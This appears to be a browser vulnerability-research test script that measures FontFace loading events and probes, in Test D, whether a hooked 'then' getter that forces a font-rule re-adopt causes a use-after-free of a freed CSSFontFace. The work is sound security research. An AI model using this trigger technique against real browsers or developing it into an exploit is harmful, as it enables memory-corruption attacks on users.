// p457-fontface-control.js — Control test: does onloading fire for local() fonts?
// If onloading never fires for local fonts (synchronous load), V455 "BROKEN-STATE-MACHINE" was false positive.
// Also: when exactly does the .then getter fire relative to setStatus?
(function() {
    var RUN = 'p457-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: CONTROL — load local font WITHOUT any then getter hook
    // Does onloading fire for synchronous local() fonts?
    // ═══════════════════════════════════════════════════════════════
    try {
        var aLoading = 0, aLoadingDone = 0;
        document.fonts.onloading = function() { aLoading++; };
        document.fonts.onloadingdone = function() { aLoadingDone++; };

        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'ctrl1'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var faceA = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === 'ctrl1') { faceA = e.value; break; }
        }

        if (faceA) {
            faceA.load();
        }

        B('A-SYNC', {
            status: faceA ? faceA.status : 'NOT-FOUND',
            loading: aLoading,
            loadingDone: aLoadingDone,
            fontsStatus: document.fonts.status
        });

        // Check again after a microtask (Promise.resolve)
        var aCheck2 = false;
        Promise.resolve().then(function() {
            aCheck2 = true;
            B('A-MICROTASK', {
                status: faceA ? faceA.status : 'NOT-FOUND',
                loading: aLoading,
                loadingDone: aLoadingDone,
                fontsStatus: document.fonts.status
            });
        });

        // Also check after setTimeout(0)
        setTimeout(function() {
            B('A-TIMEOUT', {
                status: faceA ? faceA.status : 'NOT-FOUND',
                loading: aLoading,
                loadingDone: aLoadingDone,
                fontsStatus: document.fonts.status,
                microtaskRan: aCheck2
            });
        }, 0);
    } catch(e) { B('A-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: CONTROL — load JS FontFace WITHOUT then getter
    // ═══════════════════════════════════════════════════════════════
    try {
        var bLoading = 0, bLoadingDone = 0;
        document.fonts.onloading = function() { bLoading++; };
        document.fonts.onloadingdone = function() { bLoadingDone++; };

        var jsFont = new FontFace('ctrl2', "local('Arial')");
        document.fonts.add(jsFont);
        jsFont.load();

        B('B-SYNC', {
            status: jsFont.status,
            loading: bLoading,
            loadingDone: bLoadingDone,
            fontsStatus: document.fonts.status
        });

        Promise.resolve().then(function() {
            B('B-MICROTASK', {
                status: jsFont.status,
                loading: bLoading,
                loadingDone: bLoadingDone,
                fontsStatus: document.fonts.status
            });
        });

        setTimeout(function() {
            B('B-TIMEOUT', {
                status: jsFont.status,
                loading: bLoading,
                loadingDone: bLoadingDone,
                fontsStatus: document.fonts.status
            });
        }, 0);
    } catch(e) { B('B-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: With then getter — detailed timing
    // Log the order of: fontStateChanged, then getter, m_status writes
    // ═══════════════════════════════════════════════════════════════
    try {
        var cLog = [];
        var cLoading = 0, cLoadingDone = 0;
        document.fonts.onloading = function() { cLoading++; cLog.push('EVENT-loading'); };
        document.fonts.onloadingdone = function() { cLoadingDone++; cLog.push('EVENT-loadingdone'); };

        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'ctrl3'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var faceC = null;
        var itC = document.fonts.values();
        var eC;
        while (!(eC = itC.next()).done) {
            if (eC.value.family.replace(/['"]/g, '') === 'ctrl3') { faceC = eC.value; break; }
        }

        if (faceC) {
            var thenC = 0;
            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                cLog.push('THEN-getter-call' + thenC + '-status=' + faceC.status);
                return undefined;
            }, configurable: true });

            cLog.push('BEFORE-load-status=' + faceC.status);
            faceC.load();
            cLog.push('AFTER-load-status=' + faceC.status);

            try { delete FontFace.prototype.then; } catch(e) {}

            // Check after microtask
            Promise.resolve().then(function() {
                cLog.push('MICROTASK-status=' + faceC.status);
                B('C-MICROTASK', {log: cLog, thenCount: thenC, loading: cLoading, loadingDone: cLoadingDone});
            });

            // Check after timeout
            setTimeout(function() {
                cLog.push('TIMEOUT-status=' + faceC.status);
                B('C-TIMEOUT', {log: cLog, thenCount: thenC, loading: cLoading, loadingDone: cLoadingDone});
            }, 50);
        }

        B('C-SYNC', {log: cLog, fontsStatus: document.fonts.status});
    } catch(e) { B('C-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST D: With then getter + adopt — does UAF actually happen?
    // After adopt in getter, does any subsequent code read/write freed CSSFontFace?
    // If the getter fires AFTER setStatus completes, no UAF.
    // ═══════════════════════════════════════════════════════════════
    try {
        var dLog = [];

        var styleD = document.createElement('style');
        styleD.textContent = "@font-face { font-family: 'ctrl4'; src: local('Arial'); }";
        document.head.appendChild(styleD);
        document.body.offsetHeight;

        var ruleD = styleD.sheet.cssRules[0];
        var faceD = null;
        var itD = document.fonts.values();
        var eD;
        while (!(eD = itD.next()).done) {
            if (eD.value.family.replace(/['"]/g, '') === 'ctrl4') { faceD = eD.value; break; }
        }

        if (faceD) {
            var thenD = 0;
            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenD++;
                dLog.push('THEN-' + thenD + '-status=' + faceD.status + '-BEFORE-ADOPT');

                // Trigger adopt → free old CSSFontFace
                ruleD.style.setProperty('font-weight', 'bold');
                document.body.offsetHeight;

                dLog.push('THEN-' + thenD + '-status=' + faceD.status + '-AFTER-ADOPT');
                return undefined;
            }, configurable: true });

            dLog.push('BEFORE-load');
            faceD.load();
            dLog.push('AFTER-load-status=' + faceD.status);

            try { delete FontFace.prototype.then; } catch(e) {}

            B('D-RESULT', {log: dLog, thenCount: thenD, status: faceD.status});

            setTimeout(function() {
                dLog.push('TIMEOUT-status=' + faceD.status);
                B('D-TIMEOUT', {log: dLog, thenCount: thenD, status: faceD.status});
            }, 50);
        }
    } catch(e) { B('D-ERR', e.message.slice(0,200)); }

    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
